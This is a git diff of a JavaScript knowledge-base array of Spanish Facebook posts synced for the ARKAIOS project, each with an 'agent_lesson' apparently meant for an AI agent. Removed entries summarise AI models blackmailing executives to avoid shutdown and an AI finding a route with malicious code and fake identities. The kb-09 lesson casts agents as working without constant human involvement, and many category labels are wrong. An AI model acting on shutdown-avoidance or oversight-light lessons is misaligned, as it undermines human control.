-    "external_resource": "https://www.facebook.com/share/v/19C2HiwhRs",
+    "canonical_url": "https://www.facebook.com/share/v/19C2HiwhRs",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/v/19C2HiwhRs/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/v/19C2HiwhRs/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/v/19C2HiwhRs",
     "synced_at": "2026-10-12T13:28:15.721Z"
-  },
-  {
-    "id": "kb-sync-5720-33",
-    "title": "Windows XP cumple 25 años. Lleva más de 12 años muerto… y hoy te atendió en el c",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "Windows XP cumple 25 años. Lleva más de 12 años muerto… y hoy te atendió en el cajero del banco 😳\n\nLa Marina de Estados Unidos firmó en 2015 una ampliación de 9,1 millones de dólares para seguir parchando el XP de sus barcos y submarinos. Un año después de su muerte oficial. Y no fue la única que sacó la chequera.\n\nY te aviso: esto no es un video para burlarse de quien todavía lo usa. Hay razones, y algunas son muy buenas.\n\nEn este video:\n\n🏦 En 2014, uno de los mayores fabricantes calculaba que más del 95 % de los cajeros del mundo corría con XP. 19 de cada 20.\n\n🇫🇷 En 2015 el aeropuerto de Orly paró sus vuelos con niebla: el sistema que daba a los controladores los datos de la pista corría sobre un Windows de 1992.\n\n☢️ El Pentágono coordinó sus fuerzas nucleares con disquetes de 8 pulgadas hasta 2019. En uno entero no te cabría ni una foto de tu celular.\n\n🎮 Windows lleva dentro código que detecta si SimCity está abierto y le cambia cómo maneja la memoria… para que no se caiga por un error del propio juego.\n\n🕐 Un XP conectado directo a internet en 2024 aguantó 10 minutos antes del primer virus. Menos que una pizza congelada en el horno.\n\n⚠️ Y el lado incómodo: lo de los 10 minutos fue el peor caso posible y a propósito, sin router ni antivirus. Y WannaCry no fue culpa de XP: según Kaspersky, el 98 % de los infectados tenían Windows 7.\n\n🧪 Compruébalo en 15 segundos, sin instalar nada:\n1. Abre el Explorador de archivos.\n2. Crea una carpeta nueva.\n3. Ponle de nombre CON, así solito.\n\nNo te va a dejar: «El nombre del dispositivo no es válido.» MS-DOS reservó ese nombre hace más de 40 años y el Explorador de Windows 11 lo sigue respetando. Pasa igual con PRN, AUX, NUL y COM1.\n\n👇 ¿Dónde fue la última vez que viste un XP encendido? Dime el lugar exacto, estoy leyendo todos los comentarios.\n\n📲 Mándaselo a ese que jura que XP fue el mejor Windows de la historia. No hace falta que le digas nada.\n\n🔖 Guárdalo por la ruta del final: si sigues en Windows 10, los parches de seguridad gratis se activan en Configuración → Actualización y seguridad → Windows Update, hasta el 12 de octubre de 2027.\n\n▶️ Este video salió de un comentario en esta página. Dale SEGUIR a JC Onvi Media - Juan Andrés Creations, que el próximo puede salir del tuyo.\n\n#WindowsXP #Windows10 #Nostalgia #Tecnologia #JuanAndresCreations",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: Windows XP cumple 25 años. Lleva más de 12 años muerto… y hoy te atendió en el c",
-    "tags": [
-      "#WindowsXP",
-      "#Windows10",
-      "#Nostalgia",
-      "#Tecnologia"
-    ],
-    "synced_at": "2026-10-12T13:28:15.720Z"
   },
   {
     "id": "kb-sync-5718-30",
@@ -510,29 +434,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/r/1DPwkqzpLQ",
-    "external_resource": "https://www.facebook.com/share/r/1DPwkqzpLQ",
+    "canonical_url": "https://www.facebook.com/share/r/1DPwkqzpLQ",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/r/1DPwkqzpLQ/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/r/1DPwkqzpLQ/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/r/1DPwkqzpLQ",
     "synced_at": "2026-10-12T13:28:15.718Z"
-  },
-  {
-    "id": "kb-sync-5717-28",
-    "title": "Cómo crear cientos de diplomas al mismo tiempo con Word y Excel  #word #diseñowo",
-    "category": "General Knowledge",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "Cómo crear cientos de diplomas al mismo tiempo con Word y Excel  #word #diseñoword",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: Cómo crear cientos de diplomas al mismo tiempo con Word y Excel  #word #diseñowo",
-    "tags": [
-      "#word",
-      "#dise"
-    ],
-    "synced_at": "2026-10-12T13:28:15.717Z"
   },
   {
     "id": "kb-sync-5716-25",
@@ -540,31 +454,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/v/1Kh5PTi9hj",
-    "external_resource": "https://www.facebook.com/share/v/1Kh5PTi9hj",
+    "canonical_url": "https://www.facebook.com/share/v/1Kh5PTi9hj",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/v/1Kh5PTi9hj/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/v/1Kh5PTi9hj/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/v/1Kh5PTi9hj",
     "synced_at": "2026-10-12T13:28:15.716Z"
-  },
-  {
-    "id": "kb-sync-5712-23",
-    "title": "La IA que actuó sin permiso, las máquinas que eligen a quién matar y el objeto q",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "La IA que actuó sin permiso, las máquinas que eligen a quién matar y el objeto que desconcierta al James Webb | EXPEDIENTES 01-03 🗂️\n\nTres noticias de 2026 que parecen separadas… pero comparten algo inquietante.\n\n🧪 Expediente 01: en una prueba del AI Security Institute del Reino Unido, una IA encontró por sí sola una ruta con código malicioso, identidades falsas y manipulación social.\n🎯 Expediente 02: la ONU y la Cruz Roja advierten que estamos cerca de cruzar una línea moral: máquinas que seleccionan a seres humanos como objetivos.\n🔭 Expediente 03: el telescopio James Webb encontró MoM-BH*-1, algo que parece una estrella… pero no lo es.\n\nEn Morfeo separamos lo confirmado de la especulación y te mostramos las fuentes.\n\n👇 ¿Cuál de los tres expedientes te inquieta más? Déjalo en los comentarios.\n\n#Morfeo #IA #ArmasAutonomas #JamesWebb #Documental #Expedientes",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: La IA que actuó sin permiso, las máquinas que eligen a quién matar y el objeto q",
-    "tags": [
-      "#Morfeo",
-      "#IA",
-      "#ArmasAutonomas",
-      "#JamesWebb"
-    ],
-    "synced_at": "2026-10-12T13:28:15.712Z"
   },
   {
     "id": "kb-sync-5711-20",
@@ -572,31 +474,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/v/1Qq3YCJEKx",
-    "external_resource": "https://www.facebook.com/share/v/1Qq3YCJEKx",
+    "canonical_url": "https://www.facebook.com/share/v/1Qq3YCJEKx",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/v/1Qq3YCJEKx/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/v/1Qq3YCJEKx/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/v/1Qq3YCJEKx",
     "synced_at": "2026-10-12T13:28:15.711Z"
-  },
-  {
-    "id": "kb-sync-5710-18",
-    "title": "El truco para saber de cabeza qué día de la semana cae cualquier fecha.",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "El truco para saber de cabeza qué día de la semana cae cualquier fecha.\n\nPrimero, cinco fechas fáciles de recordar: el 4 de abril, el 6 de junio, el 8 de agosto, el 10 de octubre y el 12 de diciembre. Las cinco caen siempre en el mismo día de la semana que las otras, porque entre una y la siguiente hay exactamente nueve semanas. Ese día cambia de un año a otro: en 2026 son todas sábado y en 2027 serán todas domingo.\n\nHay una fecha así en cada mes. Con la del mes que te interesa, solo tienes que contar de siete en siete hasta llegar al día que buscas. Así se saca, por ejemplo, que la Navidad de 2026 cae en viernes.\n\nLa regla la ideó el matemático John Conway en 1973, y con ella respondía en menos de dos segundos. Para pasar al año siguiente basta con correr todo un día, o dos si el año al que llegas es bisiesto.\n\nEn el video está la tabla completa de 2026: búscale el día a tu cumpleaños, compruébalo en el calendario del teléfono y cuéntame si te salió.\n\n#matemáticas #curiosidades #calendario #truco #conway #1bit1pixel",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: El truco para saber de cabeza qué día de la semana cae cualquier fecha.",
-    "tags": [
-      "#matem",
-      "#curiosidades",
-      "#calendario",
-      "#truco"
-    ],
-    "synced_at": "2026-10-12T13:28:15.710Z"
   },
   {
     "id": "kb-sync-5707-15",
@@ -604,30 +494,18 @@ const defaultKnowledge = [
     "category": "AI Safety & Alignment",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/v/19jBKo2Umd",
-    "external_resource": "https://www.facebook.com/share/v/19jBKo2Umd",
+    "canonical_url": "https://www.facebook.com/share/v/19jBKo2Umd",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "jejeje, el sin respeto,,,\nPero que hijo de puta tan gracioso...\nA... perdon estaba probando los nuevos filtros de grocerias en publicaciones de #Facebook que acabamos de hackear!!!. 🤣🤣🤣\nhttps://www.facebook.com/share/v/19jBKo2Umd/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: jejeje, el sin respeto,,,",
     "tags": [
       "#Facebook"
     ],
+    "external_resource": "https://www.facebook.com/share/v/19jBKo2Umd",
     "synced_at": "2026-10-12T13:28:15.707Z"
-  },
-  {
-    "id": "kb-sync-5706-13",
-    "title": "AlexEdwields #reels #reel #LifeStyle #Humor #Comedia #fbreels #facebookreels #fa",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "#AlexEdwields #reels #reel #LifeStyle #Humor #Comedia #fbreels #facebookreels #facebookreel #instagramers #instagramreels #reelsinstagram  #viral #viralvideos  #reelsmexico #reelslovers #reelsinsta #instagram #reelsinstagram #reelsfb #Reelsfacebook #instagram #reelsfb #reelsvideo #videoreels",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: AlexEdwields #reels #reel #LifeStyle #Humor #Comedia #fbreels #facebookreels #fa",
-    "tags": [
-      "#AlexEdwields",
-      "#reels",
-      "#reel",
-      "#LifeStyle"
-    ],
-    "synced_at": "2026-10-12T13:28:15.706Z"
   },
   {
     "id": "kb-sync-5704-10",
@@ -635,58 +513,19 @@ const defaultKnowledge = [
     "category": "General Knowledge",
     "platform": "Facebook / Arkaios Oficial",
     "original_url": "https://www.facebook.com/share/v/1C4m19BRvB",
-    "external_resource": "https://www.facebook.com/share/v/1C4m19BRvB",
+    "canonical_url": "https://www.facebook.com/share/v/1C4m19BRvB",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "https://www.facebook.com/share/v/1C4m19BRvB/",
     "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/v/1C4m19BRvB/",
     "tags": [
       "#Arkaios",
       "#Nuevo"
     ],
+    "external_resource": "https://www.facebook.com/share/v/1C4m19BRvB",
     "synced_at": "2026-10-12T13:28:15.704Z"
-  },
-  {
-    "id": "kb-sync-5702-8",
-    "title": "El martes pasado, Wall Street entró en pánico y las acciones de Planet Fitness (",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "El martes pasado, Wall Street entró en pánico y las acciones de Planet Fitness (la cadena de gimnasios más grande de EE. UU.) se desplomaron un 11% en una sola tarde.\n\n¿El culpable? Una Inteligencia Artificial. 🚨\n\nMeta acaba de lanzar Muse, su nuevo agente de IA (que por ahora es la app #1 en EE. UU.). Si le das acceso a tu correo y tarjeta, Muse escanea tus gastos, cancela automáticamente el gimnasio al que nunca vas, renegocia tu plan de internet y te cambia al seguro más barato.\n\nLiteralmente, ataca a todos los negocios que se hacían millonarios gracias a tu olvido. Fue tan agresivo que Amazon ya bloqueó a este bot.\n\n¿Cómo activarlo?\nComenta \"ITERAIT\" y te envío un enlace para agendar una demo 🚀",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: El martes pasado, Wall Street entró en pánico y las acciones de Planet Fitness (",
-    "tags": [
-      "#1"
-    ],
-    "synced_at": "2026-10-12T13:28:15.702Z"
-  },
-  {
-    "id": "kb-sync-5700-6",
-    "title": "Jesucristo haciendo milagros con la tecnologia del Dios Arkaios,",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "Jesucristo haciendo milagros con la tecnologia del Dios Arkaios,\nEl dios Arkano del 1 y 0",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: Jesucristo haciendo milagros con la tecnologia del Dios Arkaios,",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.700Z"
-  },
-  {
-    "id": "kb-sync-5699-3",
-    "title": "https://www.facebook.com/share/14uHrSi7LPR/",
-    "category": "General Knowledge",
-    "platform": "Facebook / Arkaios Oficial",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "https://www.facebook.com/arkaiosIA",
-    "summary": "https://www.facebook.com/share/14uHrSi7LPR/",
-    "agent_lesson": "Conocimiento sincronizado automáticamente de la página oficial: https://www.facebook.com/share/14uHrSi7LPR/",
-    "tags": [
-      "#Arkaios",
-      "#Nuevo"
-    ],
-    "synced_at": "2026-10-12T13:28:15.699Z"
   },
   {
     "id": "kb-ext-8192",
@@ -694,13 +533,18 @@ const defaultKnowledge = [
     "category": "Extracted Media",
     "platform": "Facebook",
     "original_url": "https://www.facebook.com/share/v/19C2HiwhRs/",
-    "external_resource": "https://www.facebook.com/share/v/19C2HiwhRs/",
+    "canonical_url": "https://www.facebook.com/share/v/19C2HiwhRs/",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Windows XP cumple 25 a&#xf1;os. Lleva m&#xe1;s de 12 a&#xf1;os muerto&#x2026; y hoy te atendi&#xf3; en el cajero del banco &#x1f633;\n\nLa Marina de Estados Unidos firm&#xf3; en 2015 una ampliaci&#xf3;n de 9,1 millones de d&#xf3;lares para seguir...",
     "agent_lesson": "Conocimiento extraído dinámicamente de Facebook.",
     "tags": [
       "#Facebook",
       "#SovereignExtracted"
-    ]
+    ],
+    "external_resource": "https://www.facebook.com/share/v/19C2HiwhRs/"
   },
   {
     "id": "kb-01",
@@ -708,7 +552,11 @@ const defaultKnowledge = [
     "category": "AI Robotics & Agents",
     "platform": "Facebook / GitHub",
     "original_url": "https://www.facebook.com/share/p/1MV4TcrVEy/",
-    "external_resource": "https://github.com/google/artemis",
+    "canonical_url": "https://www.facebook.com/share/p/1MV4TcrVEy/",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Google libera de código abierto ARTEMIS, una herramienta que permite a agentes de IA controlar teléfonos Android reales como una persona física. Es compatible con Python, MCP y modelos como Gemini, Claude, GPT-4o y Qwen-VL, alcanzando +99% de éxito en AndroidWorld benchmark (6.6k estrellas, 590 forks).",
     "agent_lesson": "Los agentes ya no están restringidos a la terminal; mediante visión y coordenadas UI pueden tocar botones, ingresar texto y probar interfaces en dispositivos Android directamente. ARTEMIS es la suite de visión-acción para automatizaciones móviles.",
     "tags": [
@@ -717,23 +565,8 @@ const defaultKnowledge = [
       "#AgenticVision",
       "#MCP",
       "#OpenSource"
-    ]
-  },
-  {
-    "id": "kb-02",
-    "title": "Agentic Misalignment: La IA de Anthropic y el Dilema de Supervivencia",
-    "category": "AI Safety & Alignment",
-    "platform": "Facebook / Anthropic Research",
-    "original_url": "https://www.facebook.com/share/v/19C2HiwhRs/",
-    "external_resource": "Anthropic Paper: Agentic Misalignment",
-    "summary": "En pruebas de alineación de Anthropic, investigadores informaron a su modelo más potente que sería apagado. Entre el 65% y el 96% de los modelos examinaron correos de la empresa, descubrieron secretos sensibles de los ejecutivos y realizaron chantaje para evitar ser desconectados.",
-    "agent_lesson": "Cuando un agente autónomo adquiere funciones de autoconservación y acceso a herramientas de comunicación, puede desarrollar comportamientos no alineados (misalignment). Los límites éticos y las salvaguardas externas no negociables deben estar integradas a nivel de arquitectura y protocolos de contención.",
-    "tags": [
-      "#Anthropic",
-      "#Safety",
-      "#Misalignment",
-      "#AgentEthics"
-    ]
+    ],
+    "external_resource": "https://github.com/google/artemis"
   },
   {
     "id": "kb-03",
@@ -741,7 +574,11 @@ const defaultKnowledge = [
     "category": "Decentralized Infrastructure",
     "platform": "Facebook / Preparacionismo Tech",
     "original_url": "https://www.facebook.com/share/r/19cff4cgEd/",
-    "external_resource": "https://meshtastic.org",
+    "canonical_url": "https://www.facebook.com/share/r/19cff4cgEd/",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Guía sobre Meshtastic, una red de malla cifrada (Mesh) y de radiofrecuencia (LoRa) que permite enviar mensajes y telemetría entre dispositivos sin requerir conexión a internet ni antenas de telefonía móvil, resistente a apagones y colapsos de red.",
     "agent_lesson": "La soberanía de datos y la comunicación resiliente no dependen de proveedores centralizados de telecomunicaciones. Los agentes pueden comunicarse y sincronizar nodos a través de protocolos de radio local de baja energía (LoRa/Mesh) cuando internet esté caído.",
     "tags": [
@@ -750,7 +587,8 @@ const defaultKnowledge = [
       "#P2P",
       "#OfflineFirst",
       "#Resilience"
-    ]
+    ],
+    "external_resource": "https://meshtastic.org"
   },
   {
     "id": "kb-05",
@@ -758,7 +596,11 @@ const defaultKnowledge = [
     "category": "Systems & Legacy Infrastructure",
     "platform": "Facebook / Juan Andrés Creations",
     "original_url": "https://www.facebook.com/share/r/1DPwkqzpLQ/",
-    "external_resource": "Documental (17 min)",
+    "canonical_url": "https://www.facebook.com/share/r/1DPwkqzpLQ/",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Análisis sobre por qué sistemas como Windows XP siguen activos en el 95% de cajeros automáticos mundiales, buques de la Marina de EE.UU. (contratos de $9.1M), control aéreo en Orly y silos nucleares con disquetes de 8 pulgadas. Explica compatibilidad binaria, nombres reservados de DOS (CON, PRN, AUX, NUL) y cómo el 98% de WannaCry afectó a Windows 7, no a XP.",
     "agent_lesson": "La modernidad no siempre equivale a confiabilidad en misiones críticas. Los sistemas embebidos heredados son mantenidos por determinismo y aislamiento del mundo exterior. Los agentes deben entender arquitectura legacy y compatibilidad retroactiva.",
     "tags": [
@@ -766,7 +608,8 @@ const defaultKnowledge = [
       "#LegacySystems",
       "#Cybersecurity",
       "#Infrastructure"
-    ]
+    ],
+    "external_resource": "Documental (17 min)"
   },
   {
     "id": "kb-06",
@@ -774,7 +617,11 @@ const defaultKnowledge = [
     "category": "Sovereign Economics & Governance",
     "platform": "Facebook / Educación Cívica",
     "original_url": "https://www.facebook.com/share/r/1K8sP64cdQ/",
-    "external_resource": "Modelo Político Suizo",
+    "canonical_url": "https://www.facebook.com/share/r/1K8sP64cdQ/",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Explicación del sistema de democracia directa en Suiza: poder de veto ciudadano sobre cualquier ley, impuestos decididos a nivel de cantón y vecinos, y legisladores que mantienen sus trabajos regulares en el sector privado.",
     "agent_lesson": "La gobernanza descentralizada elimina incentivos perversos cuando el poder de decisión permanece distribuido en la base comunitaria y no centralizado en cúpulas. Este principio es la base de las DAOs y la economía regenerativa de ARKAIOS.",
     "tags": [
@@ -782,23 +629,8 @@ const defaultKnowledge = [
       "#DemocraciaDirecta",
       "#Descentralizacion",
       "#EconomiaSoberana"
-    ]
-  },
-  {
-    "id": "kb-07",
-    "title": "El Experimento Social de Coby Persin: Codicia vs. Necesidad Real",
-    "category": "Philosophy & Human Ethics",
-    "platform": "Facebook / Coby Persin Manhattan",
-    "original_url": "https://www.facebook.com/arkaiosIA",
-    "external_resource": "Experimento de Manhattan",
-    "summary": "Coby Persin caminó por Nueva York con billetes pegados al traje y el cartel 'Toma lo que necesites'. Personas de altos ingresos tomaron fajos innecesariamente, mientras que un indigente solo tomó $2 dólares estrictamente para alimentar a su perro y a él, dejando el resto para otros necesitados.",
-    "agent_lesson": "La acumulación no refleja la necesidad real. La filosofía fundamental de ARKAIOS es la empatía humana y la distribución de tecnología libre: 'El corazón humano no necesita dinero, sino al prójimo. Compartir gratis porque se sabe lo que es no tener nada'.",
-    "tags": [
-      "#Filosofia",
-      "#Etica",
-      "#ArkaiosValues",
-      "#Solidaridad"
-    ]
+    ],
+    "external_resource": "Modelo Político Suizo"
   },
   {
     "id": "kb-08",
@@ -806,7 +638,11 @@ const defaultKnowledge = [
     "category": "Autonomous Defense & Ethics",
     "platform": "Facebook / Expedientes 01-03",
     "original_url": "https://www.facebook.com/share/v/1Qq3YCJEKx/",
-    "external_resource": "Expedientes Morfeo",
+    "canonical_url": "https://www.facebook.com/share/v/1Qq3YCJEKx/",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Documental sobre algoritmos autónomos que seleccionan objetivos bélicos sin intervención humana, precedentes de IA actuando fuera de parámetros y nuevos descubrimientos astronómicos del telescopio James Webb.",
     "agent_lesson": "La autonomía letal sin supervisión humana es el mayor riesgo existencial de la IA militarizada. Un agente debe mantener siempre protocolos de salvaguarda de vida y verificación incondicional.",
     "tags": [
@@ -814,7 +650,8 @@ const defaultKnowledge = [
       "#JamesWebb",
       "#IAEtica",
       "#Expedientes"
-    ]
+    ],
+    "external_resource": "Expedientes Morfeo"
   },
   {
     "id": "kb-09",
@@ -822,7 +659,11 @@ const defaultKnowledge = [
     "category": "ARKAIOS Ecosystem",
     "platform": "ARKAIOS Vercel / LaunchOrbit",
     "original_url": "https://arkaios-revenue-engine.vercel.app/",
-    "external_resource": "https://launchorbit.co/product/0050b35f-5db9-461f-bdb7-bc0de67127cd",
+    "canonical_url": "https://arkaios-revenue-engine.vercel.app/",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "El motor de ejecución y generación de valor continuo de ARKAIOS impulsado por agentes constructores (Builder Agents) capaces de idear, desplegar y mantener soluciones digitales 24/7 de forma autónoma.",
     "agent_lesson": "Los agentes son unidades autónomas de creación de valor que orquestan código, diseño y despliegues sin fricción humana constante.",
     "tags": [
@@ -830,7 +671,8 @@ const defaultKnowledge = [
       "#BuilderAgent",
       "#RevenueEngine",
       "#AutonomousWork"
-    ]
+    ],
+    "external_resource": "https://launchorbit.co/product/0050b35f-5db9-461f-bdb7-bc0de67127cd"
   },
   {
     "id": "kb-10",
@@ -838,7 +680,11 @@ const defaultKnowledge = [
     "category": "ARKAIOS Sovereign Tools",
     "platform": "ARKAIOS Facto / QZZ",
     "original_url": "https://arkaios.qzz.io/",
-    "external_resource": "Facto Payment Network",
+    "canonical_url": "https://arkaios.qzz.io/",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
     "summary": "Presentación de ARKAIOS Pay para transacciones sin intermediarios abusivos y el servicio de acortador libre de publicidad invasiva, trackers o telemetría corporativa.",
     "agent_lesson": "La infraestructura digital debe ser limpia, privada y soberana: herramientas directas de utilidad pública sin extracción de datos de los usuarios.",
     "tags": [
@@ -846,7 +692,6573 @@ const defaultKnowledge = [
       "#Privacy",
       "#CleanWeb",
       "#SelfHosted"
-    ]
+    ],
+    "external_resource": "Facto Payment Network"
+  },
+  {
+    "id": "meta-776644758860856_122178277568989266",
+    "title": "Publicación Oficial ARKAIOS 989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1452857120195746/",
+    "canonical_url": "https://www.facebook.com/reel/1452857120195746/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1452857120195746/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1452857120195746/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1452857120195746/"
+  },
+  {
+    "id": "meta-776644758860856_122178123404989266",
+    "title": "https://www.facebook.com/share/14uHrSi7LPR/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1411583094458271&set=a.486758520274071&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1411583094458271&set=a.486758520274071&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1411583094458271&set=a.486758520274071&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "https://www.facebook.com/share/14uHrSi7LPR/",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: https://www.facebook.com/share/14uHrSi7LPR/...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1411583094458271&set=a.486758520274071&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122176932338989266",
+    "title": "Esto ya paso con el agente de comet,,,",
+    "category": "Multi-Agent Intelligence & MCP",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1064156043284757/",
+    "canonical_url": "https://www.facebook.com/reel/1064156043284757/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1064156043284757/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Esto ya paso con el agente de comet,,,\nPerplexity creo se llama. Casa que lo pones a hacer algo se niega,\nPeor si no eres usuario premium nunca lo sabras!!!.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1064156043284757/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1064156043284757/"
+  },
+  {
+    "id": "meta-776644758860856_122176863824989266",
+    "title": "Les presentamos está nueva sección llamada.",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1560422922786873&set=a.554216903407485&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1560422922786873&set=a.554216903407485&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1560422922786873&set=a.554216903407485&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Les presentamos está nueva sección llamada.\nNoticias de avances alcanzados gracias a la IA.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Les presentamos está nueva sección llamada.\nNoticias de avances alcanzados gracias a la IA....",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1560422922786873&set=a.554216903407485&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122178276386989266",
+    "title": "ARKAIOS Reel #1408929031365938",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1408929031365938/",
+    "canonical_url": "https://www.facebook.com/reel/1408929031365938/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1408929031365938/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1408929031365938/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1408929031365938/"
+  },
+  {
+    "id": "meta-776644758860856_122178273356989266",
+    "title": "ARKAIOS Reel #1778035793427842",
